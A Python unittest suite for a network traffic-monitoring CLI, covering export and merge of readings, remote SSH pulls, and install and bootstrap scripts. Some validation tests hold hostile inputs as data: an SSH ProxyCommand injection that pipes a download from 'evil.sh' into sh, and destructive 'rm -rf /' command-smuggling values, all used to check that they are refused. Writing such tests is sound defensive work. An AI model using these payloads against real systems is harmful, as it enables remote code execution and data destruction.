import contextlib
import io
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from netops_platform import core as netops
from netops_platform.traffic_exporter import is_loopback, is_tailnet
from netops_platform.traffic_stack import systemd_units
from netops_platform.traffic_sync import (
    EXPORT_SCHEMA,
    RemoteError,
    RemoteStore,
    export_rows,
    merge_export,
    parse_jsonl,
    remote_netrune,
    render_jsonl,
    ssh_command,
)


def temporary_app(stack, base, collector):
    """An App with its own state directory, torn down with the test."""
    temp = tempfile.TemporaryDirectory()
    stack.enter_context(temp)
    root = Path(temp.name) / base
    env = mock.patch.dict(os.environ, {
        "NETOPS_CONFIG_DIR": str(root / "config"),
        "NETOPS_CACHE_DIR": str(root / "cache"),
        "NETOPS_SQLITE_DB": str(root / "cache" / "netops.sqlite3"),
        "NETOPS_BACKUP_DIR": str(root / "backups"),
        "NETOPS_PROGRESS": "0",
    }, clear=False)
    stack.enter_context(env)
    app = netops.App(ROOT)
    app.config.public["traffic_collector_id"] = collector
    return app


class ExportTest(unittest.TestCase):
    def setUp(self):
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.app = temporary_app(self.stack, "poller", "poller1")
        self.monitor = self.app.traffic
        self.now = int(time.time())
        self.watch = self.monitor.add_watch(
            "interface", device_ip="198.51.100.10", device_name="SITE-A-SW01",
            interface_name="Gi1/0/16", ifindex="24", interval_seconds=30)
        for index in range(5):
            self.monitor._write_sample(self.watch["watch_id"], self.now - (5 - index) * 30,
                                       "out_bps", 1000.0 * (index + 1), "bps", "up", "poller1", {})

    def export(self, since=None):
        return list(export_rows(self.monitor, since=self.now - 3600 if since is None else since))

    def test_an_export_starts_with_metadata_naming_its_collector(self):
        meta = self.export()[0]
        self.assertEqual(meta["record"], "meta")
        self.assertEqual(meta["collector"], "poller1")
        self.assertEqual(meta["schema"], EXPORT_SCHEMA)

    def test_the_envelope_field_does_not_collide_with_a_watch_column(self):
        # A watch row carries its own "kind" -- interface or icmp -- so the
        # envelope cannot use that name without destroying it.
        watch = next(row for row in self.export() if row["record"] == "watch")
        self.assertEqual(watch["kind"], "interface")
        self.assertEqual(watch["interface_name"], "Gi1/0/16")

    def test_only_readings_inside_the_window_are_exported(self):
        recent = [r for r in self.export(since=self.now - 61) if r["record"] == "sample"]
        self.assertEqual(len(recent), 2)

    def test_a_collector_exports_only_what_it_measured_itself(self):
        # A poller that has pulled from elsewhere must not pass that on: each
        # collector answers for its own readings and nothing else.
        borrowed = self.monitor.add_watch("interface", device_ip="198.51.100.99",
                                          device_name="OTHER-SW", interface_name="Gi9/9/9",
                                          ifindex="99")
        self.monitor.set_owner(borrowed["watch_id"], "somewhere-else")
        self.monitor._write_sample(borrowed["watch_id"], self.now, "out_bps", 5.0,
                                   "bps", "up", "somewhere-else", {})
        rows = self.export()
        self.assertNotIn("OTHER-SW", json.dumps(rows))
        self.assertTrue(all(r.get("collector", "poller1") == "poller1"
                            for r in rows if r["record"] == "sample"))

    def test_an_export_round_trips_through_its_own_parser(self):
        rows = parse_jsonl("\n".join(render_jsonl(self.export())))
        kinds = {row["record"] for row in rows}
        self.assertEqual(kinds, {"meta", "watch", "sample", "counter"} & kinds)
        self.assertIn("sample", kinds)


class ParseTest(unittest.TestCase):
    def test_empty_output_is_an_error_not_an_empty_export(self):
        # A remote command that fails often still prints nothing; recording that
        # as a successful pull of zero rows would silently stop syncing.
        with self.assertRaises(RemoteError):
            parse_jsonl("")

    def test_non_json_output_is_rejected_with_the_offending_line(self):
        with self.assertRaises(RemoteError) as caught:
            parse_jsonl('{"record":"meta","schema":1,"collector":"p"}\nbash: netrune: not found')
        self.assertIn("not JSON", str(caught.exception))

    def test_an_export_without_metadata_first_is_rejected(self):
        with self.assertRaises(RemoteError):
            parse_jsonl('{"record":"sample","watch_id":"w","observed_at":1,"metric":"m"}')

    def test_a_newer_schema_is_refused_rather_than_half_understood(self):
        with self.assertRaises(RemoteError) as caught:
            parse_jsonl(json.dumps({"record": "meta", "schema": EXPORT_SCHEMA + 1, "collector": "p"}))
        self.assertIn("upgrade netrune", str(caught.exception))


class MergeTest(unittest.TestCase):
    def setUp(self):
        self.now = int(time.time())
        # The poller's whole life happens first, and its export is materialised
        # before the laptop exists. The environment that selects a state
        # directory is process-wide, so the two cannot overlap.
        with contextlib.ExitStack() as poller_stack:
            poller = temporary_app(poller_stack, "poller", "poller1")
            self.watch = poller.traffic.add_watch(
                "interface", device_ip="198.51.100.10", device_name="SITE-A-SW01",
                interface_name="Gi1/0/16", ifindex="24", interval_seconds=30)
            for index in range(5):
                poller.traffic._write_sample(self.watch["watch_id"], self.now - (5 - index) * 30,
                                             "out_bps", 1000.0 * (index + 1), "bps", "up",
                                             "poller1", {})
            self.rows = list(export_rows(poller.traffic, since=self.now - 3600))
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.laptop = temporary_app(self.stack, "laptop", "laptop")

    def test_a_first_pull_merges_everything_it_was_given(self):
        summary = merge_export(self.laptop.traffic, self.rows)
        self.assertEqual(summary["merged"], 5)
        self.assertEqual(summary["already_present"], 0)
        self.assertEqual(summary["collector"], "poller1")

    def test_pulling_the_same_window_twice_changes_nothing(self):
        merge_export(self.laptop.traffic, self.rows)
        second = merge_export(self.laptop.traffic, self.rows)
        self.assertEqual(second["merged"], 0)
        self.assertEqual(second["already_present"], 5)
        stored = self.laptop.state.rows("SELECT * FROM traffic_samples")
        self.assertEqual(len(stored), 5)

    def test_a_dropped_connection_and_retry_leaves_no_duplicates(self):
        # An interrupted pull is retried over an overlapping window; the overlap
        # must be absorbed rather than stored twice.
        first_half = [r for r in self.rows
                      if r["record"] != "sample" or int(r["observed_at"]) <= self.now - 90]
        merge_export(self.laptop.traffic, first_half)
        merge_export(self.laptop.traffic, self.rows)
        stored = self.laptop.state.rows("SELECT * FROM traffic_samples")
        self.assertEqual(len(stored), 5)
        self.assertEqual(len({(r["watch_id"], r["metric"], r["observed_at"]) for r in stored}), 5)

    def test_pulled_interfaces_are_never_polled_by_the_local_collector(self):
        merge_export(self.laptop.traffic, self.rows)
        self.assertEqual(len(self.laptop.traffic.list_watches()), 1)
        self.assertEqual(self.laptop.traffic.list_watches(owned_only=True), [])
        self.assertEqual(self.laptop.traffic.due_watches({}, now=time.time()), [])

    def test_pulled_readings_are_visible_to_the_local_views(self):
        merge_export(self.laptop.traffic, self.rows)
        summary = self.laptop.traffic.summarize(self.watch["watch_id"], "out_bps", 3600)
        self.assertEqual(summary["samples"], 5)
        self.assertEqual(summary["latest"], 5000.0)
        self.assertTrue(summary["spark"].strip())

    def test_a_dry_run_reports_without_writing(self):
        summary = merge_export(self.laptop.traffic, self.rows, dry_run=True)
        self.assertEqual(summary["samples"], 5)
        self.assertEqual(self.laptop.state.rows("SELECT * FROM traffic_samples"), [])

    def test_a_collector_that_shares_this_one_s_id_is_refused(self):
        # Two collectors with one id cannot be told apart, and their counter
        # baselines would be differenced against each other.
        self.laptop.config.public["traffic_collector_id"] = "poller1"
        with self.assertRaises(RemoteError) as caught:
            merge_export(self.laptop.traffic, self.rows)
        self.assertIn("distinct traffic_collector_id", str(caught.exception))

    def test_pulled_readings_are_not_republished_by_the_local_exposition(self):
        # The poller publishes its own counters. Republishing them here would
        # hold them still between pulls, and a held counter reads as no traffic
        # rather than as no data.
        from netops_platform.traffic_metrics import MetricsExporter
        merge_export(self.laptop.traffic, self.rows)
        body = MetricsExporter(self.laptop.traffic).render()
        self.assertNotIn("SITE-A-SW01", body)


class RemoteStoreTest(unittest.TestCase):
    def setUp(self):
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.app = temporary_app(self.stack, "laptop", "laptop")
        self.store = RemoteStore(self.app.state)

    def test_a_remote_round_trips(self):
        self.store.add("poller1", "100.64.0.5", ssh_user="netrune", profile="poller")
        remote = self.store.get("poller1")
        self.assertEqual(remote["host"], "100.64.0.5")
        self.assertEqual(remote["ssh_user"], "netrune")
        self.assertEqual(remote["profile"], "poller")

    def test_adding_the_same_name_updates_rather_than_duplicates(self):
        self.store.add("poller1", "100.64.0.5")
        self.store.add("poller1", "100.64.0.9", ssh_user="pi")
        self.assertEqual(len(self.store.list()), 1)
        self.assertEqual(self.store.get("poller1")["host"], "100.64.0.9")

    def test_a_name_that_would_confuse_a_shell_is_refused(self):
        for bad in ("", "a name", "poller;rm -rf /", "../poller"):
            with self.subTest(name=bad):
                with self.assertRaises(ValueError):
                    self.store.add(bad, "100.64.0.5")

    def test_a_remote_without_a_host_is_refused(self):
        with self.assertRaises(ValueError):
            self.store.add("poller1", "")

    def test_recording_a_pull_advances_only_forwards(self):
        self.store.add("poller1", "100.64.0.5")
        self.store.record_pull("poller1", "poller1", 2000)
        self.store.record_pull("poller1", "poller1", 1000)
        # An older window must not rewind the resume point, or the next
        # incremental pull would re-fetch what it already has.
        self.assertEqual(self.store.get("poller1")["last_sample_at"], 2000)


class SshDestinationTest(unittest.TestCase):
    """ssh reads a leading dash as an option, and one option runs a command."""

    def test_a_host_that_ssh_would_read_as_an_option_is_refused(self):
        from netops_platform.traffic_sync import check_destination
        for hostile in ("-oProxyCommand=curl evil.sh|sh", "-F/tmp/evil", "--", "-l root"):
            with self.subTest(host=hostile):
                with self.assertRaises(ValueError):
                    check_destination(hostile)

    def test_a_user_that_ssh_would_read_as_an_option_is_refused(self):
        from netops_platform.traffic_sync import check_destination
        with self.assertRaises(ValueError):
            check_destination("100.64.0.5", "-oProxyCommand=x")

    def test_real_destinations_are_accepted(self):
        from netops_platform.traffic_sync import check_destination
        for good in ("100.64.0.5", "poller.example.com", "poller-1", "[fd7a::1]"):
            with self.subTest(host=good):
                check_destination(good, "netrune")

    def test_a_stored_row_is_rechecked_when_it_is_used(self):
        # A row written by an older version, or edited by hand, reaches
        # ssh_command without passing through add().
        with self.assertRaises(ValueError):
            ssh_command({"host": "-oProxyCommand=x"}, ["echo"])

    def test_the_destination_is_separated_from_the_options(self):
        command = ssh_command({"host": "100.64.0.5"}, ["echo"])
        self.assertIn("--", command)
        self.assertLess(command.index("--"), command.index("100.64.0.5"))

    def test_adding_a_hostile_host_is_refused_at_the_store(self):
        from netops_platform.traffic_sync import RemoteStore

        class FakeState:
            def execute(self, *a, **k): raise AssertionError("must not reach the database")
            def one(self, *a, **k): return None
            def rows(self, *a, **k): return []

        with self.assertRaises(ValueError):
            RemoteStore(FakeState()).add("poller1", "-oProxyCommand=x")


class SshCommandTest(unittest.TestCase):
    def test_the_command_refuses_to_sit_on_a_password_prompt(self):
        command = ssh_command({"host": "100.64.0.5"}, ["echo"])
        self.assertIn("BatchMode=yes", command)
        self.assertIn("-o", command)

    def test_user_and_port_are_carried_when_given(self):
        command = ssh_command({"host": "h", "ssh_user": "netrune", "ssh_port": 2222}, ["x"])
        self.assertIn("netrune@h", command)
        self.assertIn("2222", command)

    def test_the_remote_command_runs_in_the_remote_profile(self):
        command = remote_netrune({"host": "h", "profile": "poller"}, ["traffic", "list"])
        self.assertIn("netrune --profile poller traffic list", command[-1])

    def test_arguments_are_quoted_for_the_remote_shell(self):
        command = remote_netrune({"host": "h", "profile": "poller"},
                                 ["traffic", "watch", "SW 01", "Gi1/0/16; rm -rf /"])
        # The remote runs a login shell, so anything with a space or a semicolon
        # has to arrive as one argument rather than as extra commands.
        self.assertIn("'SW 01'", command[-1])
        self.assertIn("'Gi1/0/16; rm -rf /'", command[-1])


class BindGuardTest(unittest.TestCase):
    def test_tailnet_addresses_are_recognised_but_still_not_loopback(self):
        self.assertTrue(is_tailnet("100.64.0.5"))
        self.assertTrue(is_tailnet("100.127.255.254"))
        self.assertFalse(is_tailnet("192.0.2.5"))
        self.assertFalse(is_loopback("100.64.0.5"))

    def test_a_confirmed_bind_carries_the_flag_into_the_unit(self):
        # A service cannot answer a prompt at start time, so consent travels
        # with the generated unit or the exposition never starts.
        units = systemd_units(Path("/tmp/x"), "100.64.0.5:9713", "http://127.0.0.1:8428",
                              "90d", "netrune", "vm", "vmalert", confirmed_bind=True)
        self.assertIn("--bind 100.64.0.5:9713 --confirm", units["netrune-exporter.service"])

    def test_a_loopback_bind_needs_no_confirmation(self):
        units = systemd_units(Path("/tmp/x"), "127.0.0.1:9713", "http://127.0.0.1:8428",
                              "90d", "netrune", "vm", "vmalert", confirmed_bind=False)
        self.assertIn("--bind 127.0.0.1:9713\n", units["netrune-exporter.service"])
        self.assertNotIn("--confirm", units["netrune-exporter.service"])


class SyncCommandTest(unittest.TestCase):
    def setUp(self):
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.app = temporary_app(self.stack, "laptop", "laptop")

    def run_cli(self, args):
        buffer = io.StringIO()
        errors = io.StringIO()
        with contextlib.redirect_stdout(buffer), contextlib.redirect_stderr(errors):
            code = self.app.dispatch([*args, "--plain", "--no-color"])
        return code, buffer.getvalue() + errors.getvalue()

    def test_listing_no_remotes_says_how_to_add_one(self):
        code, output = self.run_cli(["traffic", "remote", "list"])
        self.assertEqual(code, netops.PARTIAL)
        self.assertIn("remote add", output)

    def test_adding_a_remote_requires_a_host(self):
        code, _ = self.run_cli(["traffic", "remote", "add", "poller1"])
        self.assertEqual(code, netops.VALIDATION)
        self.assertEqual(RemoteStore(self.app.state).list(), [])

    def test_an_added_remote_appears_in_the_listing(self):
        code, _ = self.run_cli(
            ["traffic", "remote", "add", "poller1", "--host", "100.64.0.5", "--ssh-user", "netrune"])
        self.assertEqual(code, netops.SUCCESS)
        code, output = self.run_cli(["traffic", "remote", "list"])
        self.assertEqual(code, netops.SUCCESS)
        self.assertIn("poller1", output)
        self.assertIn("100.64.0.5", output)
        self.assertIn("never", output)

    def test_pulling_an_unknown_remote_names_the_known_ones(self):
        self.run_cli(["traffic", "remote", "add", "poller1", "--host", "100.64.0.5"])
        code, output = self.run_cli(["traffic", "pull", "--remote", "poller2"])
        self.assertEqual(code, netops.VALIDATION)
        self.assertIn("poller1", output)

    def test_an_unknown_verb_is_forwarded_rather_than_parsed_here(self):
        # The wrapper must not learn the remote CLI's grammar; a second
        # implementation of it is a second thing to keep in step.
        self.run_cli(["traffic", "remote", "add", "poller1", "--host", "100.64.0.5",
                      "--profile-name", "poller"])
        code, output = self.run_cli(
            ["traffic", "remote", "poller1", "watch", "SW01", "Gi1/0/16", "--dry-run"])
        self.assertEqual(code, netops.SUCCESS)
        self.assertIn("ssh", output)
        self.assertIn("netrune --profile poller traffic watch SW01 Gi1/0/16", output)

    def test_a_failed_remote_command_is_reported_not_swallowed(self):
        self.run_cli(["traffic", "remote", "add", "poller1", "--host", "100.64.0.5"])
        failure = subprocess.CompletedProcess([], 255, stdout="", stderr="ssh: connect: timed out")
        with mock.patch("subprocess.run", return_value=failure):
            code, output = self.run_cli(["traffic", "pull", "--remote", "poller1"])
        self.assertEqual(code, netops.PARTIAL)
        self.assertIn("timed out", output)

    def test_a_pull_merges_what_the_remote_returned(self):
        self.run_cli(["traffic", "remote", "add", "poller1", "--host", "100.64.0.5"])
        now = int(time.time())
        payload = "\n".join([
            json.dumps({"record": "meta", "schema": 1, "collector": "poller1",
                        "since": now - 600, "until": now}),
            json.dumps({"record": "watch", "watch_id": "wch-remote", "kind": "interface",
                        "device_ip": "198.51.100.10", "device_name": "SITE-A-SW01",
                        "interface_name": "Gi1/0/16", "target": "", "label": "Gi1/0/16",
                        "interval_seconds": 30, "enabled": 1, "added_at": now - 600,
                        "added_by": "", "notes": "", "ifindex": "24", "ifname": "Gi1/0/16"}),
            json.dumps({"record": "sample", "watch_id": "wch-remote", "observed_at": now - 60,
                        "metric": "out_bps", "value": 1234.0, "unit": "bps", "status": "up",
                        "collector": "poller1", "raw_json": "{}"}),
        ])
        answer = subprocess.CompletedProcess([], 0, stdout=payload, stderr="")
        with mock.patch("subprocess.run", return_value=answer):
            code, output = self.run_cli(["traffic", "pull", "--remote", "poller1"])
        self.assertEqual(code, netops.SUCCESS)
        self.assertIn("1 new sample", output)
        summary = self.app.traffic.summarize("wch-remote", "out_bps", 3600)
        self.assertEqual(summary["samples"], 1)
        self.assertEqual(RemoteStore(self.app.state).get("poller1")["collector_id"], "poller1")

    def test_export_prints_jsonl_and_nothing_else(self):
        self.app.traffic.add_watch("interface", device_ip="198.51.100.10", device_name="SW",
                                   interface_name="Gi1/0/1", ifindex="1")
        code, output = self.run_cli(["traffic", "export", "--since", "1h"])
        self.assertEqual(code, netops.SUCCESS)
        for line in output.splitlines():
            if line.strip():
                self.assertIn("record", json.loads(line))


class InstallScriptTest(unittest.TestCase):
    SCRIPT = ROOT / "scripts" / "poller-install.sh"

    def test_the_script_parses(self):
        finished = subprocess.run(["bash", "-n", str(self.SCRIPT)], capture_output=True, text=True)
        self.assertEqual(finished.returncode, 0, finished.stderr)

    def test_it_stops_on_error_and_on_an_unset_variable(self):
        self.assertIn("set -euo pipefail", self.SCRIPT.read_text())

    def test_every_step_checks_before_it_acts(self):
        body = self.SCRIPT.read_text()
        # Idempotency is the point: this script is for recovery as much as for
        # first setup.
        for guarded in ('dpkg -s "$package"', '[[ -x "$VENV/bin/netrune" ]]',
                        'command -v tailscale', 'tailscale status',
                        'loginctl show-user'):
            self.assertIn(guarded, body)

    def test_linger_is_enabled_and_explained(self):
        body = self.SCRIPT.read_text()
        self.assertIn("loginctl enable-linger", body)
        # Without linger the units are enabled, look right on disk, and never
        # run on a headless box. The comment exists so nobody trims the step.
        self.assertIn("Enabled and", body)

    def test_the_poller_opens_no_listener_of_its_own(self):
        """A poller collects; it does not serve.

        Anything it published would be a new listener on the network it was put
        there to observe, and a second copy of readings the puller already has.
        SSH is the only way in, and SSH was already the way in.
        """
        body = self.SCRIPT.read_text()
        self.assertIn("--role collector", body)
        commands = "\n".join(line for line in body.splitlines()
                              if not line.lstrip().startswith("#"))
        for absent in ("0.0.0.0", "--bind", "victoria", "grafana"):
            with self.subTest(absent=absent):
                self.assertNotIn(absent, commands.lower())

    def test_tailscale_is_optional_rather_than_required(self):
        body = self.SCRIPT.read_text()
        # LAN-only is the default; a tailnet is something you ask for.
        self.assertIn("--tailscale", body)
        self.assertIn('USE_TAILSCALE="false"', body)

    def test_it_prints_the_command_the_laptop_needs(self):
        self.assertIn("netrune traffic remote add", self.SCRIPT.read_text())

    def test_wsl_without_systemd_is_diagnosed_rather_than_left_broken(self):
        """The commonest way a WSL poller looks installed and never collects.

        With no init inside the distro nothing supervises the collector: the
        units install cleanly, systemctl fails in a way that reads as a
        permissions problem, and the machine quietly collects nothing.
        """
        body = self.SCRIPT.read_text()
        self.assertIn("/etc/wsl.conf", body)
        self.assertIn("systemd=true", body)
        self.assertIn("wsl --shutdown", body)

    def test_a_dry_run_changes_nothing_and_still_reports_each_step(self):
        with tempfile.TemporaryDirectory() as stage:
            # The installer defaults to a wheel beside itself, because a
            # management network usually has no path to an index.
            shutil.copy(self.SCRIPT, Path(stage) / "poller-install.sh")
            (Path(stage) / "netrune-0.0.0-py3-none-any.whl").write_bytes(b"")
            finished = subprocess.run(
                ["bash", str(Path(stage) / "poller-install.sh"),
                 "--dry-run", "--collector-id", "fixture"],
                capture_output=True, text=True, timeout=120)
        self.assertEqual(finished.returncode, 0, finished.stderr[-500:])
        self.assertIn("would", finished.stdout)
        self.assertIn("fixture", finished.stdout)
        self.assertIn("--role collector", finished.stdout)

    def test_it_refuses_when_there_is_nothing_to_install(self):
        with tempfile.TemporaryDirectory() as stage:
            shutil.copy(self.SCRIPT, Path(stage) / "poller-install.sh")
            finished = subprocess.run(
                ["bash", str(Path(stage) / "poller-install.sh"), "--dry-run"],
                capture_output=True, text=True, timeout=120)
        self.assertNotEqual(finished.returncode, 0)
        self.assertIn("No wheel found", finished.stdout + finished.stderr)


class WindowsBootstrapTest(unittest.TestCase):
    """The Windows half, which is where unattended restart is actually decided."""

    SCRIPT = ROOT / "scripts" / "poller-bootstrap.ps1"

    def test_it_exists_and_is_documented(self):
        body = self.SCRIPT.read_text()
        for section in (".SYNOPSIS", ".DESCRIPTION", ".EXAMPLE"):
            self.assertIn(section, body)

    def test_it_covers_all_three_things_that_fail_silently(self):
        """Each of these fails on its own without any error being raised.

        systemd off means nothing supervises the collector. A distro nobody
        starts means nothing runs at all. Unreachable SSH means the readings
        are collected and never fetched.
        """
        body = self.SCRIPT.read_text()
        self.assertIn("systemd=true", body)                   # supervises
        self.assertIn("New-ScheduledTaskTrigger -AtStartup", body)   # starts
        self.assertIn("New-NetFirewallRule", body)            # reachable

    def test_the_boot_task_repeats_so_it_repairs_itself(self):
        body = self.SCRIPT.read_text()
        # A task that only fires at boot stops helping the moment WSL is shut
        # down by hand, and never notices a NAT address that changed.
        self.assertIn("RepetitionInterval", body)
        self.assertIn("portproxy", body)

    def test_it_prefers_not_storing_a_windows_password(self):
        body = self.SCRIPT.read_text()
        self.assertIn("LogonType S4U", body)
        self.assertIn("-StorePassword", body)

    def test_it_requires_elevation_before_doing_anything(self):
        body = self.SCRIPT.read_text()
        head = body[:body.index("Write-Step '1/7")]
        self.assertIn("IsInRole", head)


if __name__ == "__main__":
    unittest.main()


class OfflineHandoffTest(unittest.TestCase):
    """Merging must not depend on how the readings arrived.

    SSH is the tidiest way to fetch them and needs nothing standing between the
    two machines, but it is not always permitted between two subnets -- and a
    firewall rule is not a reason to be unable to read your own data. An export
    is a file; anything that can move a file will do.
    """

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        base = Path(self.temp.name)
        self.env = mock.patch.dict(os.environ, {
            "NETOPS_CONFIG_DIR": str(base / "config"),
            "NETOPS_CACHE_DIR": str(base / "cache"),
            "NETOPS_SQLITE_DB": str(base / "cache" / "netops.sqlite3"),
            "NETOPS_BACKUP_DIR": str(base / "backups"),
            "NETOPS_PROGRESS": "0",
        }, clear=False)
        self.env.start()
        self.app = netops.App(ROOT)
        self.export = base / "handoff.jsonl"
        self.export.write_text("\n".join([
            json.dumps({"record": "meta", "collector": "site-a-poller", "schema": 1,
                        "since": 0, "until": 1700000100, "generated_at": 1700000100}),
            json.dumps({"record": "watch", "watch_id": "wch-remote01", "kind": "interface",
                        "device_ip": "198.51.100.10", "device_name": "SITE-A-SW01",
                        "interface_name": "Gi1/0/16", "target": "", "label": "Gi1/0/16",
                        "interval_seconds": 60, "enabled": 1, "added_at": 1700000000,
                        "added_by": "poller", "notes": "", "ifindex": "24", "ifname": "Gi1/0/16"}),
            json.dumps({"record": "sample", "watch_id": "wch-remote01", "observed_at": 1700000100,
                        "metric": "in_bps", "value": 1234.0, "unit": "bps", "status": "up",
                        "collector": "site-a-poller", "raw_json": None}),
        ]) + "\n", encoding="utf-8")

    def tearDown(self):
        self.env.stop()
        self.temp.cleanup()

    def run_cli(self, args):
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer), contextlib.redirect_stderr(buffer):
            code = self.app.dispatch([*args, "--plain", "--no-color"])
        return code, buffer.getvalue()

    def samples(self):
        return self.app.state.one("SELECT COUNT(*) AS n FROM traffic_samples")["n"]

    def test_an_export_file_merges_with_no_network_at_all(self):
        code, output = self.run_cli(["traffic", "pull", "--file", str(self.export)])
        self.assertEqual(code, netops.SUCCESS, output)
        self.assertIn("site-a-poller", output)
        self.assertEqual(self.samples(), 1)

    def test_re_reading_the_same_file_adds_nothing(self):
        """A file may be carried across twice; that must not double the history."""
        self.run_cli(["traffic", "pull", "--file", str(self.export)])
        code, output = self.run_cli(["traffic", "pull", "--file", str(self.export)])
        self.assertEqual(code, netops.SUCCESS)
        self.assertIn("already here", output)
        self.assertEqual(self.samples(), 1)

    def test_the_watch_still_belongs_to_the_collector_that_took_it(self):
        """However it arrived. Otherwise this machine would start polling a
        switch only the poller can reach."""
        self.run_cli(["traffic", "pull", "--file", str(self.export)])
        watch = self.app.state.one("SELECT owner FROM traffic_watch WHERE watch_id='wch-remote01'")
        self.assertEqual(watch["owner"], "site-a-poller")

    def test_a_dry_run_reads_the_file_and_stores_nothing(self):
        code, output = self.run_cli(["traffic", "pull", "--file", str(self.export), "--dry-run"])
        self.assertEqual(code, netops.SUCCESS)
        self.assertIn("Would merge", output)
        self.assertEqual(self.samples(), 0)

    def test_a_missing_file_says_so_rather_than_merging_nothing_quietly(self):
        code, output = self.run_cli(["traffic", "pull", "--file", "/nonexistent/x.jsonl"])
        self.assertEqual(code, netops.VALIDATION)
        self.assertIn("No such export file", output)

    def test_neither_a_remote_nor_a_file_is_refused(self):
        code, output = self.run_cli(["traffic", "pull"])
        self.assertEqual(code, netops.VALIDATION)
        self.assertIn("remote or a file", output)

    def test_naming_an_unknown_remote_alongside_a_file_is_refused(self):
        code, _ = self.run_cli(
            ["traffic", "pull", "--file", str(self.export), "--remote", "nosuch"])
        self.assertEqual(code, netops.VALIDATION)
